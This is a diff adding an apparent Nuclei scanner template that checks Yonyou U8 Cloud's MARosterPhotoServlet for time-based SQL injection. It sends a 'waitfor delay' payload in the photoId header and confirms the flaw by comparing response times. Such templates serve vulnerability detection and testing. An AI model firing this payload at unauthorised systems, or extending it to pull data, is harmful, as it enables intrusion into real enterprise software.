@@ -1,0 +1,40 @@
+id: youyouU8-MARosterPhotoServlet-sqli
+
+info:
+  name: 用友U8 Cloud MARosterPhotoServlet SQL注入漏洞
+  author: youyouU8
+  severity: high
+  tags: youyouU8
+
+http:
+  - raw:
+      - |+
+        GET /servlet/~uap/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?pageId=login HTTP/1.0
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        accountcode: U8cloud
+        type: pid
+        photoId: 1
+
+      - |+
+        GET /servlet/~uap/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?pageId=login HTTP/1.0
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        accountcode: U8cloud
+        type: pid
+        photoId: 1';waitfor delay'0:0:4'-- Alks
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_2 >= 4'
+          - 'duration_1 < 2'
+          - 'duration_2 < 10'
+          - 'len(body) < 20'
+        condition: and
+
